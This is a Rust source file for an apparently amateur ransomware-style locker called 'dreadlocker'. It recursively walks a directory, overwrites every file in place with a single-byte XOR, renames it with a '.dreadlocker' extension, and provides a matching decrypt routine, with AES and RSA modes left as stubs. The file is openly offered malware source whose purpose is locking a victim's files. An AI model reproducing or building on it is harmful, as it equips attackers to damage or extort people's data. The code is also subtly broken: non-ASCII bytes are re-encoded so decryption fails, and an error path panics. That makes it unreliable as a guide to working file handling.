// File containing all the required encryption-related functions

use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::PathBuf;
use std::process;

use crate::settings::Config;

pub fn iterate_dir(config: &mut Config) {
    let file_list = fs::read_dir(config.get_directory()).unwrap_or_else(|err| {
        eprintln!(
            "Error reading {}'s content: {}. Exiting...",
            config.get_directory(),
            err
        );
        process::exit(1);
    });
    for file in file_list {
        let path = file.as_ref().unwrap().path();
        if let Ok(metadata) = path.metadata() {
            match metadata.is_file() {
                true => {
                    if config.decrypt() {
                        println!("DEBUG: Decrypting '{}'", path.display());
                        decrypt_file(file.unwrap().path(), &config);
                    } else {
                        println!("DEBUG: Encrypting '{}'", path.display());
                        encrypt_file(file.unwrap().path(), &config);
                    }
                }
                false => {
                    println!("DEBUG: '{}' is a folder, continuing...", path.display());
                    config.edit_dir(path.into_os_string().into_string().unwrap());
                    iterate_dir(config);
                }
            }
        }
    }
}

// The following are private to the module
/*
   Adds the ".dreadlocker" extension to the file
*/
fn add_extension(file_path: &PathBuf) {
    let name: &str = file_path.as_path().as_os_str().to_str().unwrap();
    let mut new_name: String = String::from(name);
    new_name.push_str(".dreadlocker");
    fs::rename(name, new_name).unwrap_or_else(|err| {
        eprintln!("DEBUG: Error appending the extension to {}: {}", name, err);
    });
}

/*
   Removes the ".dreadlocker" extension to the file
*/
fn del_extension(file_path: &PathBuf) -> Option<u8> {
    let name: &str = file_path.as_path().as_os_str().to_str().unwrap();
    let res: Option<usize> = name.find(".dreadlocker");
    let new_name: String;
    if let Some(_) = res {
        new_name = name.replace(".dreadlocker", "");
    } else {
        println!("DEBUG: file lacking the appropriate extension");
        return None;
    }
    fs::rename(name, new_name).unwrap_or_else(|err| {
        eprintln!("DEBUG: Error deleting the extension to {}: {}", name, err);
    });
    Some(0)
}

/*
   Encrypts the file using the selected encryption type (0 = XOR, 1 = AES, 2 = RSA)
*/
pub fn encrypt_file(file_path: PathBuf, config: &Config) {
    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(file_path.clone())
        .unwrap_or_else(|err| {
            process::exit(1);
        });
    let mut contents = String::new();
    let reading_done = file.read_to_string(&mut contents);
    if reading_done.is_err() {
    } else {
        match config.get_enc_type() {
            1 => {
                // TODO: other encryption type
                println!("DEBUG: Type 1 encryption is not yet implemented. Exiting...");
                process::exit(0);
            }
            _ => {
                // 0 or anything else => simple XOR
                add_extension(&file_path);
                let xor_number: u8 = 5;
                let mut result: String = String::new();
                for i in contents.as_bytes().iter() {
                    let value = *i ^ xor_number;
                    // println!("Value : {} towards {}", i, value);
                    result.push(char::from(value));
                }
                file.seek(SeekFrom::Start(0)).unwrap();
                file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                    eprintln!(
                        "DEBUG: Error overwriting {}: {}. Sufficient permissions?",
                        &file_path.display(),
                        err
                    );
                });
            }
        }
    }
}

/*
   Decrypts the file using the selected encryption type (0 = XOR, 1 = AES, 2 = RSA)
*/
pub fn decrypt_file(file_path: PathBuf, config: &Config) {
    let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(file_path.clone())
        .unwrap_or_else(|err| {
            eprintln!("Error opening {} : {}", file_path.display(), err);
            process::exit(1);
        });
    let mut contents = String::new();
    let reading_done = file.read_to_string(&mut contents);
    if reading_done.is_err() {
        eprintln!(
            "Error reading {} : {}",
            file_path.as_path().as_os_str().to_str().unwrap(),
            reading_done.unwrap()
        );
    } else {
        match config.get_enc_type() {
            1 => {
                // TODO: other encryption type
                println!("Type 1 encryption is not yet implemented. Exiting...");
                process::exit(0);
            }
            _ => {
                // 0 or anything else => simple XOR
                if let Some(_) = del_extension(&file_path) {
                    let xor_number: u8 = 5;
                    let mut result: String = String::new();
                    for i in contents.as_bytes().iter() {
                        let value = *i ^ xor_number;
                        // println!("Value : {} towards {}", i, value);
                        result.push(char::from(value));
                    }
                    file.seek(SeekFrom::Start(0)).unwrap();
                    file.write_all(result.as_bytes()).unwrap_or_else(|err| {
                        eprintln!(
                            "Error overwriting {}: {}. Sufficient permissions?",
                            &file_path.display(),
                            err
                        );
                    });
                }
            }
        }
    }
}
